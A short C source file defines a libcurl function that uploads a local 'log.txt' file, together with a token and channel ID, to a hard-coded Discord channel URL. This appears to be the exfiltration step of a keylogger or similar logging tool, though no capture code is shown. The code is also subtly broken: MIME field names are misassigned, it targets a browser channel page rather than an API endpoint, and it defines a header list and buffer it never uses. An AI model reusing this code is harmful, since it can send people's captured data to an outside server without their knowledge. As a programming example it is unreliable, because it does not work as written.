#include <curl.h>

void uploadFile(const char *token, const char *channelID, const char *filePath) {
    CURL *curl;
    CURLcode res;

    curl_mime *mime;
    curl_mimepart *part;
    struct curl_slist *headerlist = NULL;
    static const char buf[] = "Expect:";

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    mime = curl_mime_init(curl);

    part = curl_mime_addpart(mime);
    curl_mime_name(part, "");
    curl_mime_data(part, token, CURL_ZERO_TERMINATED);

    part = curl_mime_addpart(mime);
    curl_mime_name(part, "1223264248348676226");
    curl_mime_data(part, channelID, CURL_ZERO_TERMINATED);

    part = curl_mime_addpart(mime);
    curl_mime_name(part, "E:\\Codeing\\Python Language\\Projects\\Project_19\\log.txt");
    curl_mime_filedata(part, filePath);

    curl_easy_setopt(curl, CURLOPT_URL, "https://discord.com/channels/1206894784703242251/1223264248348676226");
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);

    res = curl_easy_perform(curl);

    if(res != CURLE_OK)
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

    curl_easy_cleanup(curl);
    curl_mime_free(mime);
    curl_global_cleanup();
}
